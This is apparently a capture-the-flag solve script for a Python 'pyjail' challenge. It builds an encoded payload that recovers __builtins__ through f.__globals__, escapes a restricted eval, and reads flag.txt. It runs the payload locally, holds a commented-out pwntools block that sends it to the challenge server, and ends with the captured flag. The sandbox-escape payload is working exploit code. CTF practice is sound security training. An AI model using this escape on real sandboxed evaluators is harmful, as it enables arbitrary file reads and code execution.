#!/usr/bin/env python3
import sys

from parity1 import encode, highlight


def err(*args, **kwargs):
    print(*args, **kwargs, file=sys.stderr)


def test_payload(inp):
    f = lambda: None
    eval(inp, {"__builtins__": None, 'f': f})


builtins = encode('builtins')

# # launches help(), but it is not in fact helpful because there's no pager
# help = encode('f.__builtins__["help"]()')
# inp = f'''f\t.__globals__.\tpop\t(\t"_"+"_"+{builtins}+"_"+"_").eval\t(\t{help})'''

print_flag = encode(
    'f.__builtins__["print"](f.__builtins__["open"]("flag.txt").read())')
inp = f'''f\t.__globals__.\tpop\t(\t"_"+"_"+{builtins}+"_"+"_").eval\t(\t{print_flag})'''

# highlight parity errors in the payload and run it locally
print(inp)
err(highlight(inp))
test_payload(inp)
exit()

# # execute the payload
# from pwn import remote
# r = remote('challs3.pyjail.club', 9328)
# r.recvuntil(b'> ')
# r.sendline(inp.encode())
# r.interactive()

# jail{parity2_1e2e8963ea65a0333f617}
